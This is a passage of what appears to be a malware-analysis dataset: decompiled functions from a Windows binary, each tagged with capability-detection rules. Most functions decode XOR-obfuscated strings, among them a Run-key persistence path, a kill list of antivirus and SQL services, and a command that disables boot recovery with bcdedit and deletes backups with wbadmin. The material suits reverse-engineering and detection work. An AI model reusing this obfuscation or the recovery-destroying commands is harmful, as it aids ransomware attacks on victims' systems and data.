*(param_1 + 0x3e) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._42_2_;\n    *(param_1 + 0xfa) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._44_2_;\n    *(param_1 + 0x3f) = *param_1 ^ *0x4224da;\n    *(param_1 + 0xfe) = *param_1 ^ str.XO1XADpO01[0];\n    *(param_1 + 0x40) = *param_1 ^ str.XO1XADpO01[1];\n    *(param_1 + 0x102) = *param_1 ^ str.XO1XADpO01[2];\n    *(param_1 + 0x41) = *param_1 ^ str.XO1XADpO01[3];\n    *(param_1 + 0x106) = *param_1 ^ str.XO1XADpO01[4];\n    *(param_1 + 0x42) = *param_1 ^ str.XO1XADpO01[5];\n    *(param_1 + 0x10a) = *param_1 ^ str.XO1XADpO01[6];\n    *(param_1 + 0x43) = *param_1 ^ str.XO1XADpO01[7];\n    *(param_1 + 0x10e) = *param_1 ^ str.XO1XADpO01[8];\n    *(param_1 + 0x44) = *param_1 ^ str.XO1XADpO01[9];\n    *(param_1 + 0x112) = *param_1 ^ str.XO1XADpO01[10];\n    *(param_1 + 0x45) = *param_1 ^ *0x4224f2;\n    *(param_1 + 0x116) = *param_1 ^ str.__s_[0];\n    *(param_1 + 0x46) = *param_1 ^ str.__s_[1];\n    *(param_1 + 0x11a) = *param_1 ^ str.__s_[2];\n    *(param_1 + 0x47) = *param_1 ^ str.__s_[3];\n    *(param_1 + 0x11e) = *param_1 ^ str.__s_[4];\n    *(param_1 + 0x48) = *param_1 ^ *0x4224fe;\n    *(param_1 + 0x122) = *param_1 ^ *0x422500;\n    *(param_1 + 0x49) = *param_1 ^ *0x422502;\n    *(param_1 + 0x126) = *param_1 ^ *0x422504;\n    *(param_1 + 0x4a) = *param_1 ^ *0x422506;\n    *(param_1 + 0x12a) = *param_1 ^ *0x422508;\n    *(param_1 + 0x4b) = *param_1 ^ *0x42250a;\n    *(param_1 + 0x12e) = *param_1 ^ *0x42250c;\n    *(param_1 + 0x4c) = *param_1 ^ *0x42250e;\n    *(param_1 + 0x132) = *param_1 ^ *0x422510;\n    *(param_1 + 0x4d) = *param_1 ^ *0x422512;\n    *(param_1 + 0x136) = *param_1 ^ str.wrapper._0_2_;\n    *(param_1 + 0x4e) = *param_1 ^ str.wrapper._2_2_;\n    *(param_1 + 0x13a) = *param_1 ^ str.wrapper._4_2_;\n    *(param_1 + 0x4f) = *param_1 ^ str.wrapper._6_2_;\n    *(param_1 + 0x13e) = *param_1 ^ str.DefWatch._0_2_;\n    *(param_1 + 0x50) = *param_1 ^ str.DefWatch._2_2_;\n    *(param_1 + 0x142) = *param_1 ^ str.DefWatch._4_2_;\n    *(param_1 + 0x51) = *param_1 ^ str.DefWatch._6_2_;\n    *(param_1 + 0x146) = *param_1 ^ *0x422524;\n    *(param_1 + 0x52) = *param_1 ^ *0x422526;\n    *(param_1 + 0x14a) = *param_1 ^ str.ccEvtMgr._0_2_;\n    *(param_1 + 0x53) = *param_1 ^ str.ccEvtMgr._2_2_;\n    *(param_1 + 0x14e) = *param_1 ^ str.ccEvtMgr._4_2_;\n    *(param_1 + 0x54) = *param_1 ^ str.ccEvtMgr._6_2_;\n    *(param_1 + 0x152) = *param_1 ^ *0x422530;\n    *(param_1 + 0x55) = *param_1 ^ *0x422532;\n    *(param_1 + 0x156) = *param_1 ^ str.ccSetMgr._0_2_;\n    *(param_1 + 0x56) = *param_1 ^ str.ccSetMgr._2_2_;\n    *(param_1 + 0x15a) = *param_1 ^ str.ccSetMgr._4_2_;\n    *(param_1 + 0x57) = *param_1 ^ str.ccSetMgr._6_2_;\n    *(param_1 + 0x15e) = *param_1 ^ *0x42253c;\n    *(param_1 + 0x58) = *param_1 ^ *0x42253e;\n    *(param_1 + 0x162) = *param_1 ^ str.SavRoam._0_2_;\n    *(param_1 + 0x59) = *param_1 ^ str.SavRoam._2_2_;\n    *(param_1 + 0x166) = *param_1 ^ str.SavRoam._4_2_;\n    *(param_1 + 0x5a) = *param_1 ^ str.SavRoam._6_2_;\n    *(param_1 + 0x16a) = *param_1 ^ str.Sqlservr._0_2_;\n    *(param_1 + 0x5b) = *param_1 ^ str.Sqlservr._2_2_;\n    *(param_1 + 0x16e) = *param_1 ^ str.Sqlservr._4_2_;\n    *(param_1 + 0x5c) = *param_1 ^ str.Sqlservr._6_2_;\n    *(param_1 + 0x172) = *param_1 ^ *0x422550;\n    *(param_1 + 0x5d) = *param_1 ^ *0x422552;\n    *(param_1 + 0x176) = *param_1 ^ str.sqlagent._0_2_;\n    *(param_1 + 0x5e) = *param_1 ^ str.sqlagent._2_2_;\n    *(param_1 + 0x17a) = *param_1 ^ str.sqlagent._4_2_;\n    *(param_1 + 0x5f) = *param_1 ^ str.sqlagent._6_2_;\n    *(param_1 + 0x17e) = *param_1 ^ *0x42255c;\n    *(param_1 + 0x60) = *param_1 ^ *0x42255e;\n    *(param_1 + 0x182) = *param_1 ^ str.sqladhlp._0_2_;\n    *(param_1 + 0x61) = *param_1 ^ str.sqladhlp._2_2_;\n    *(param_1 + 0x186) = *param_1 ^ str.sqladhlp._4_2_;\n    *(param_1 + 0x62) = *param_1 ^ str.sqladhlp._6_2_;\n    *(param_1 + 0x18a) = *param_1 ^ *0x422568;\n    *(param_1 + 99) = *param_1 ^ *0x42256a;\n    *(param_1 + 0x18e) = *param_1 ^ str.Culserver._0_2_;\n    *(param_1 + 100) = *param_1 ^ str.Culserver._2_2_;\n    *(param_1 + 0x192) = *param_1 ^ str.Culserver._4_2_;\n    *(param_1 + 0x65) = 0;\n    return param_1;\n}\n",
        "token_count": 3593
    },
    "00402d50": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00402d50(uint *param_1)\n\n{\n    *param_1 = 0xd0055;\n    param_1[1] = 0x64001a;\n    param_1[2] = 0x14000d;\n    param_1[3] = 0x250011;\n    param_1[4] = 0x65001a;\n    param_1[5] = 0x550064;\n    *(param_1 + 6) = *0x4224f2 ^ 0x55;\n    *(param_1 + 0x1a) = str.__s_._0_4_ ^ 0x55;\n    *(param_1 + 7) = str.__s_._0_4_ >> 0x10 ^ 0x55;\n    *(param_1 + 0x1e) = str.__s_._4_4_ ^ 0x55;\n    *(param_1 + 8) = str.__s_._4_4_ >> 0x10 ^ 0x55;\n    *(param_1 + 0x22) = *0x4224fc ^ 0x55;\n    *(param_1 + 9) = *0x4224fc >> 0x10 ^ 0x55;\n    *(param_1 + 0x26) = *0x422500 ^ 0x55;\n    *(param_1 + 10) = *0x422500 >> 0x10 ^ 0x55;\n    *(param_1 + 0x2a) = *0x422504 ^ 0x55;\n    *(param_1 + 0xb) = 0;\n    return param_1;\n}\n",
        "token_count": 388
    },
    "00402e10": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "manually build AES constants/65409eccd04443b5b13c632c5ab643ce",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00402e10(uint *param_1)\n\n{\n    *param_1 = 0x94a0629;\n    param_1[1] = 0x485a5a5f;\n    param_1[2] = 0x4740444d;\n    param_1[3] = 0x454c4d09;\n    param_1[4] = 0x94c5d4c;\n    param_1[5] = 0x4d48415a;\n    param_1[6] = 0x95a5e46;\n    param_1[7] = 0x45454806;\n    param_1[8] = 0x5c580609;\n    param_1[9] = 0x95d4c40;\n    param_1[10] = 0x445e090f;\n    param_1[0xb] = 0x5a094a40;\n    param_1[0xc] = 0x464d4841;\n    param_1[0xd] = 0x59464a5e;\n    param_1[0xe] = 0x4c4d0950;\n    param_1[0xf] = 0x4c5d4c45;\n    param_1[0x10] = 0x4b090f09;\n    param_1[0x11] = 0x4d4c4d4a;\n    param_1[0x12] = 0x6095d40;\n    param_1[0x13] = 0x95d4c5a;\n    param_1[0x14] = 0x4f4c4d52;\n    param_1[0x15] = 0x5d455c48;\n    param_1[0x16] = 0x464b0954;\n    param_1[0x17] = 0x5d5a5d46;\n    *(param_1 + 0x18) = 0x48;\n    *(param_1 + 0x61) = *param_1 ^ 0x74;\n    *(param_1 + 0x62) = *param_1 ^ 0x75;\n    *(param_1 + 99) = *param_1 ^ 0x73;\n    *(param_1 + 0x19) = *param_1 ^ 0x70;\n    *(param_1 + 0x65) = *param_1 ^ 0x6f;\n    *(param_1 + 0x66) = *param_1 ^ 0x6c;\n    *(param_1 + 0x67) = *param_1 ^ 0x69;\n    *(param_1 + 0x1a) = *param_1 ^ 99;\n    *(param_1 + 0x69) = *param_1 ^ 0x79;\n    *(param_1 + 0x6a) = *param_1 ^ 0x20;\n    *(param_1 + 0x6b) = *param_1 ^ 0x69;\n    *(param_1 + 0x1b) = *param_1 ^ 0x67;\n    *(param_1 + 0x6d) = *param_1 ^ 0x6e;\n    *(param_1 + 0x6e) = *param_1 ^ 0x6f;\n    *(param_1 + 0x6f) = *param_1 ^ 0x72;\n    *(param_1 + 0x1c) = *param_1 ^ 0x65;\n    *(param_1 + 0x71) = *param_1 ^ 0x61;\n    *(param_1 + 0x72) = *param_1 ^ 0x6c;\n    *(param_1 + 0x73) = *param_1 ^ 0x6c;\n    *(param_1 + 0x1d) = *param_1 ^ 0x66;\n    *(param_1 + 0x75) = *param_1 ^ 0x61;\n    *(param_1 + 0x76) = *param_1 ^ 0x69;\n    *(param_1 + 0x77) = *param_1 ^ 0x6c;\n    *(param_1 + 0x1e) = *param_1 ^ 0x75;\n    *(param_1 + 0x79) = *param_1 ^ 0x72;\n    *(param_1 + 0x7a) = *param_1 ^ 0x65;\n    *(param_1 + 0x7b) = *param_1 ^ 0x73;\n    *(param_1 + 0x1f) = *param_1 ^ 0x20;\n    *(param_1 + 0x7d) = *param_1 ^ 0x26;\n    *(param_1 + 0x7e) = *param_1 ^ 0x20;\n    *(param_1 + 0x7f) = *param_1 ^ 0x62;\n    *(param_1 + 0x20) = *param_1 ^ 99;\n    *(param_1 + 0x81) = *param_1 ^ 100;\n    *(param_1 + 0x82) = *param_1 ^ 0x65;\n    *(param_1 + 0x83) = *param_1 ^ 100;\n    *(param_1 + 0x21) = *param_1 ^ 0x69;\n    *(param_1 + 0x85) = *param_1 ^ 0x74;\n    *(param_1 + 0x86) = *param_1 ^ 0x20;\n    *(param_1 + 0x87) = *param_1 ^ 0x2f;\n    *(param_1 + 0x22) = *param_1 ^ 0x73;\n    *(param_1 + 0x89) = *param_1 ^ 0x65;\n    *(param_1 + 0x8a) = *param_1 ^ 0x74;\n    *(param_1 + 0x8b) = *param_1 ^ 0x20;\n    *(param_1 + 0x23) = *param_1 ^ 0x7b;\n    *(param_1 + 0x8d) = *param_1 ^ 100;\n    *(param_1 + 0x8e) = *param_1 ^ 0x65;\n    *(param_1 + 0x8f) = *param_1 ^ 0x66;\n    *(param_1 + 0x24) = *param_1 ^ 0x61;\n    *(param_1 + 0x91) = *param_1 ^ 0x75;\n    *(param_1 + 0x92) = *param_1 ^ 0x6c;\n    *(param_1 + 0x93) = *param_1 ^ 0x74;\n    *(param_1 + 0x25) = *param_1 ^ 0x7d;\n    *(param_1 + 0x95) = *param_1 ^ 0x20;\n    *(param_1 + 0x96) = *param_1 ^ 0x72;\n    *(param_1 + 0x97) = *param_1 ^ 0x65;\n    *(param_1 + 0x26) = *param_1 ^ 99;\n    *(param_1 + 0x99) = *param_1 ^ 0x6f;\n    *(param_1 + 0x9a) = *param_1 ^ 0x76;\n    *(param_1 + 0x9b) = *param_1 ^ 0x65;\n    *(param_1 + 0x27) = *param_1 ^ 0x72;\n    *(param_1 + 0x9d) = *param_1 ^ 0x79;\n    *(param_1 + 0x9e) = *param_1 ^ 0x65;\n    *(param_1 + 0x9f) = *param_1 ^ 0x6e;\n    *(param_1 + 0x28) = *param_1 ^ 0x61;\n    *(param_1 + 0xa1) = *param_1 ^ 0x62;\n    *(param_1 + 0xa2) = *param_1 ^ 0x6c;\n    *(param_1 + 0xa3) = *param_1 ^ 0x65;\n    *(param_1 + 0x29) = *param_1 ^ 100;\n    *(param_1 + 0xa5) = *param_1 ^ 0x20;\n    *(param_1 + 0xa6) = *param_1 ^ 0x6e;\n    *(param_1 + 0xa7) = *param_1 ^ 0x6f;\n    *(param_1 + 0x2a) = *param_1 ^ 0x20;\n    *(param_1 + 0xa9) = *param_1 ^ 0x26;\n    *(param_1 + 0xaa) = *param_1 ^ 0x20;\n    *(param_1 + 0xab) = *param_1 ^ 0x77;\n    *(param_1 + 0x2b) = *param_1 ^ 0x62;\n    *(param_1 + 0xad) = *param_1 ^ 0x61;\n    *(param_1 + 0xae) = *param_1 ^ 100;\n    *(param_1 + 0xaf) = *param_1 ^ 0x6d;\n    *(param_1 + 0x2c) = *param_1 ^ 0x69;\n    *(param_1 + 0xb1) = *param_1 ^ 0x6e;\n    *(param_1 + 0xb2) = *param_1 ^ 0x20;\n    *(param_1 + 0xb3) = *param_1 ^ 100;\n    *(param_1 + 0x2d) = *param_1 ^ 0x65;\n    *(param_1 + 0xb5) = *param_1 ^ 0x6c;\n    *(param_1 + 0xb6) = *param_1 ^ 0x65;\n    *(param_1 + 0xb7) = *param_1 ^ 0x74;\n    *(param_1 + 0x2e) = *param_1 ^ 0x65;\n    *(param_1 + 0xb9) = *param_1 ^ 0x20;\n    *(param_1 + 0xba) = *param_1 ^ 99;\n    *(param_1 + 0xbb) = *param_1 ^ 0x61;\n    *(param_1 + 0x2f) = *param_1 ^ 0x74;\n    *(param_1 + 0xbd) = *param_1 ^ 0x61;\n    *(param_1 + 0xbe) = *param_1 ^ 0x6c;\n    *(param_1 + 0xbf) = *param_1 ^ 0x6f;\n    *(param_1 + 0x30) = *param_1 ^ 0x67;\n    *(param_1 + 0xc1) = *param_1 ^ 0x20;\n    *(param_1 + 0xc2) = *param_1 ^ 0x2d;\n    *(param_1 + 0xc3) = *param_1 ^ 0x71;\n    *(param_1 + 0x31) = *param_1 ^ 0x75;\n    *(param_1 + 0xc5) = *param_1 ^ 0x69;\n    *(param_1 + 0xc6) = *param_1 ^ 0x65;\n    *(param_1 + 199) = *param_1 ^ 0x74;\n    *(param_1 + 0x32) = 0;\n    return param_1;\n}\n",
        "token_count": 2775
    },
    "004032e0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.004032e0(uint *param_1)\n\n{\n    *param_1 = 0x5f547130;\n    param_1[1] = 0x74105552;\n    param_1[2] = 0x445b4355;\n    param_1[3] = 0x6310405f;\n    param_1[4] = 0x59464255;\n    *(param_1 + 5) = 0x5553;\n    *(param_1 + 0x16) = 0;\n    return param_1;\n}\n",
        "token_count": 133
    },
    "00403340": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00403340(uint *param_1)\n\n{\n    *param_1 = 0x5c586231;\n    param_1[1] = 0x72485d41;\n    param_1[2] = 0x545f5f5e;\n    param_1[3] = 0x5e584552;\n    param_1[4] = 0x5f507c5f;\n    param_1[5] = 0x43545650;\n    *(param_1 + 6) = 0;\n    return param_1;\n}\n",
        "token_count": 135
    },
    "00403380": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00403380(uint *param_1)\n\n{\n    *param_1 = 0x4003a69;\n    param_1[1] = 0x47100519;\n    param_1[2] = 0x1d1a103a;\n    param_1[3] = 0x1b3d040c;\n    param_1[4] = 0xa201008;\n    *(param_1 + 5) = 0x706;\n    *(param_1 + 0x16) = 0;\n    return param_1;\n}\n",
        "token_count": 134
    },
    "00403440": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00403440(uint *param_1)\n\n{\n    *param_1 = 0x2e20244f;\n    param_1[1] = 0x2a623623;\n    param_1[2] = 0x2a623f37;\n    param_1[3] = 0x21262821;\n    param_1[4] = 0x2a3c622a;\n    param_1[5] = 0x2c26393d;\n    *(param_1 + 6) = 0x2a;\n    return param_1;\n}\n",
        "token_count": 139
    },
    "00403af0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00403af0(uint *param_1)\n\n{\n    *param_1 = 0x1d183a71;\n    param_1[1] = 0x5115141d;\n    param_1[2] = 0x121e0301;\n    param_1[3] = 0x4b020214;\n    param_1[4] = 0x51025451;\n    param_1[5] = 0x1518012a;\n    param_1[6] = 0x1d54514b;\n    *(param_1 + 7) = 0x2c15;\n    *(param_1 + 0x1e) = 0;\n    return param_1;\n}\n",
        "token_count": 170
    },
    "00403b50": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00403b50(uint *param_1)\n\n{\n    *param_1 = 0x322a1245;\n    param_1[1] = 0x2c017173;\n    param_1[2] = 0x29272436;\n    param_1[3] = 0x322a1220;\n    param_1[4] = 0x36037173;\n    param_1[5] = 0x2c212017;\n    param_1[6] = 0x31262037;\n    param_1[7] = 0x2b2a2c;\n    return param_1;\n}\n",
        "token_count": 151
    },
    "00403b90": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00403b90(uint *param_1)\n\n{\n    *param_1 = 0x3d7e321d;\n    param_1[1] = 0x7c6e6e6b;\n    param_1[2] = 0x73747079;\n    param_1[3] = 0x7178593d;\n    param_1[4] = 0x3d786978;\n    param_1[5] = 0x797c754e;\n    param_1[6] = 0x3d6e6a72;\n    param_1[7] = 0x71715c32;\n    param_1[8] = 0x684c323d;\n    param_1[9] = 0x697874;\n    return param_1;\n}\n",
        "token_count": 190
    },
    "00403be0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00403be0(uint *param_1)\n\n{\n    *param_1 = 0x55165a75;\n    param_1[1] = 0x10111617;\n    param_1[2] = 0x55011c11;\n    param_1[3] = 0x110065a;\n    param_1[4] = 0x10110e55;\n    param_1[5] = 0x19001413;\n    param_1[6] = 0x7550801;\n    param_1[7] = 0x31a1610;\n    param_1[8] = 0x100c0710;\n    param_1[9] = 0x1917141b;\n    param_1[10] = 0x3b551110;\n    *(param_1 + 0xb) = 0x1a;\n    return param_1;\n}\n",
        "token_count": 213
    },
    "00403c40": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00403c40(uint *param_1)\n\n{\n    *param_1 = 0x34773b14;\n    param_1[1] = 0x71707776;\n    param_1[2] = 0x34607d70;\n    param_1[3] = 0x6071673b;\n    param_1[4] = 0x71706f34;\n    param_1[5] = 0x78617572;\n    param_1[6] = 0x76346960;\n    param_1[7] = 0x67607b7b;\n    param_1[8] = 0x61607560;\n    param_1[9] = 0x787b6467;\n    param_1[10] = 0x346d777d;\n    param_1[0xb] = 0x7b7a737d;\n    param_1[0xc] = 0x78757166;\n    param_1[0xd] = 0x7d757278;\n    param_1[0xe] = 0x71666178;\n    *(param_1 + 0xf) = 0x67;\n    return param_1;\n}\n",
        "token_count": 281
    },
    "00403cc0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00403cc0(uint *param_1)\n\n{\n    *param_1 = 0x5b18547b;\n    param_1[1] = 0x1f1a190c;\n    param_1[2] = 0x5b151216;\n    param_1[3] = 0x3e373e3f;\n    param_1[4] = 0x285b3e2f;\n    param_1[5] = 0x3e2f2822;\n    param_1[6] = 0x3a2f2836;\n    param_1[7] = 0x3a393e2f;\n    param_1[8] = 0x2b2e3038;\n    *(param_1 + 9) = 0;\n    return param_1;\n}\n",
        "token_count": 196
    },
    "00403d10": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00403d10(uint *param_1)\n\n{\n    *param_1 = 0x14571b34;\n    param_1[1] = 0x50555643;\n    param_1[2] = 0x145a5d59;\n    param_1[3] = 0x71787170;\n    param_1[4] = 0x67147160;\n    param_1[5] = 0x7160676d;\n    param_1[6] = 0x75606779;\n    param_1[7] = 0x75767160;\n    param_1[8] = 0x64617f77;\n    param_1[9] = 0x51501914;\n    param_1[10] = 0x51405158;\n    param_1[0xb] = 0x5150587b;\n    *(param_1 + 0xc) = 0x4047;\n    *(param_1 + 0x32) = 0;\n    return param_1;\n}\n",
        "token_count": 243
    },
    "00403d80": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00403d80(uint *param_1)\n\n{\n    *param_1 = 0xd4e022d;\n    param_1[1] = 0x4e44405a;\n    param_1[2] = 0x6c657e0d;\n    param_1[3] = 0x6e7a6269;\n    param_1[4] = 0xd747d62;\n    param_1[5] = 0x44424302;\n    param_1[6] = 0x5f485943;\n    param_1[7] = 0x44594e4c;\n    *(param_1 + 8) = 0x485b;\n    *(param_1 + 0x22) = 0;\n    return param_1;\n}\n",
        "token_count": 187
    },
    "00403dd0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00403dd0(uint *param_1)\n\n{\n    *param_1 = 0x682b6748;\n    param_1[1] = 0x3c3e2d3f;\n    param_1[2] = 0x24213c3d;\n    param_1[3] = 0x68242b68;\n    param_1[4] = 0x3d2b2d3b;\n    param_1[5] = 0x313c213a;\n    *(param_1 + 6) = 0;\n    return param_1;\n}\n",
        "token_count": 142
    },
    "00403e10": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00403e10(uint *param_1)\n\n{\n    *param_1 = 0x1d5e123d;\n    param_1[1] = 0x494b584a;\n    param_1[2] = 0x51544948;\n    param_1[3] = 0x1d515e1d;\n    param_1[4] = 0x494e444e;\n    *(param_1 + 5) = 0x5058;\n    *(param_1 + 0x16) = 0;\n    return param_1;\n}\n",
        "token_count": 138
    },
    "00403e50": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00403e50(uint *param_1)\n\n{\n    *param_1 = 0x1d5e123d;\n    param_1[1] = 0x494b584a;\n    param_1[2] = 0x51544948;\n    param_1[3] = 0x1d515e1d;\n    param_1[4] = 0x514d4d5c;\n    param_1[5] = 0x495c5e54;\n    param_1[6] = 0x535254;\n    return param_1;\n}\n",
        "token_count": 140
    },
    "00403e90": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00403e90(uint *param_1)\n\n{\n    *param_1 = 0x5e5d6432;\n    param_1[1] = 0x12575f47;\n    param_1[2] = 0x56535a61;\n    param_1[3] = 0x7112455d;\n    param_1[4] = 0x124b425d;\n    param_1[5] = 0x44771214;\n    param_1[6] = 0x12465c57;\n    param_1[7] = 0x12555d5e;\n    param_1[8] = 0x53575e51;\n    *(param_1 + 9) = 0x5c;\n    return param_1;\n}\n",
        "token_count": 186
    },
    "00403f00": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00403f00(uint *param_1)\n\n{\n    *param_1 = 0x7b635b0c;\n    param_1[1] = 0x695e383a;\n    param_1[2] = 0x787e697a;\n    param_1[3] = 0x3a7b635b;\n    param_1[4] = 0x5e7f4a38;\n    param_1[5] = 0x7e656869;\n    param_1[6] = 0x65786f69;\n    *(param_1 + 7) = 0x6263;\n    *(param_1 + 0x1e) = 0;\n    return param_1;\n}\n",
        "token_count": 175
    },
    "00403fc0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00403fc0(uint *param_1)\n\n{\n    *param_1 = 0x6e664107;\n    param_1[1] = 0x2763626b;\n    param_1[2] = 0x6e276873;\n    param_1[3] = 0x6e736e69;\n    param_1[4] = 0x7d6e6b66;\n    param_1[5] = 0x54552762;\n    param_1[6] = 0x68642746;\n    param_1[7] = 0x7f627369;\n    *(param_1 + 8) = 0x73;\n    return param_1;\n}\n",
        "token_count": 169
    },
    "00404010": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00404010(uint *param_1)\n\n{\n    *param_1 = 0xf02296c;\n    param_1[1] = 0x181c151e;\n    param_1[2] = 0x4c020305;\n    param_1[3] = 0x9020308;\n    param_1[4] = 0x5384c42;\n    param_1[5] = 0x4c560901;\n    param_1[6] = 0x4c080049;\n    param_1[7] = 0x1f150d08;\n    param_1[8] = 0x800494c;\n    param_1[9] = 0x1903044c;\n    param_1[10] = 0x494c1f1e;\n    param_1[0xb] = 0x14c0800;\n    param_1[0xc] = 0x18190205;\n    param_1[0xd] = 0x494c1f09;\n    param_1[0xe] = 0x1f4c0800;\n    param_1[0xf] = 0x2030f09;\n    *(param_1 + 0x10) = 0x1f08;\n    *(param_1 + 0x42) = 0;\n    return param_1;\n}\n",
        "token_count": 320
    },
    "00404090": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404090(uint8_t *arg_8h)\n\n{\n    uchar *in_ECX;\n    \n    *in_ECX = 0x55;\n    in_ECX[1] = *arg_8h ^ 0x55;\n    in_ECX[2] = arg_8h[1] ^ 0x55;\n    in_ECX[3] = arg_8h[2] ^ 0x55;\n    in_ECX[4] = arg_8h[3] ^ 0x55;\n    in_ECX[5] = arg_8h[4] ^ 0x55;\n    in_ECX[6] = arg_8h[5] ^ 0x55;\n    in_ECX[7] = arg_8h[6] ^ 0x55;\n    in_ECX[8] = arg_8h[7] ^ 0x55;\n    in_ECX[9] = arg_8h[8] ^ 0x55;\n    in_ECX[10] = arg_8h[9] ^ 0x55;\n    in_ECX[0xb] = arg_8h[10] ^ 0x55;\n    in_ECX[0xc] = arg_8h[0xb] ^ 0x55;\n    in_ECX[0xd] = arg_8h[0xc] ^ 0x55;\n    in_ECX[0xe] = arg_8h[0xd] ^ 0x55;\n    in_ECX[0xf] = arg_8h[0xe] ^ 0x55;\n    in_ECX[0x10] = arg_8h[0xf] ^ 0x55;\n    in_ECX[0x11] = arg_8h[0x10] ^ 0x55;\n    in_ECX[0x12] = arg_8h[0x11] ^ 0x55;\n    in_ECX[0x13] = arg_8h[0x12] ^ 0x55;\n    in_ECX[0x14] = arg_8h[0x13] ^ 0x55;\n    in_ECX[0x15] = arg_8h[0x14] ^ 0x55;\n    in_ECX[0x16] = arg_8h[0x15] ^ 0x55;\n    in_ECX[0x17] = arg_8h[0x16] ^ 0x55;\n    in_ECX[0x18] = arg_8h[0x17] ^ 0x55;\n    in_ECX[0x19] = arg_8h[0x18] ^ 0x55;\n    in_ECX[0x1a] = arg_8h[0x19] ^ 0x55;\n    in_ECX[0x1b] = arg_8h[0x1a] ^ 0x55;\n    in_ECX[0x1c] = arg_8h[0x1b] ^ 0x55;\n    in_ECX[0x1d] = arg_8h[0x1c] ^ 0x55;\n    in_ECX[0x1e] = arg_8h[0x1d] ^ 0x55;\n    in_ECX[0x1f] = arg_8h[0x1e] ^ 0x55;\n    in_ECX[0x20] = arg_8h[0x1f] ^ 0x55;\n    in_ECX[0x21] = arg_8h[0x20] ^ 0x55;\n    in_ECX[0x22] = arg_8h[0x21] ^ 0x55;\n    in_ECX[0x23] = arg_8h[0x22] ^ 0x55;\n    in_ECX[0x24] = 0;\n    return;\n}\n",
        "token_count": 889
    },
    "004042a0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "manually build AES constants/65409eccd04443b5b13c632c5ab643ce",
            "resolve function by parsing PE exports"
        ],
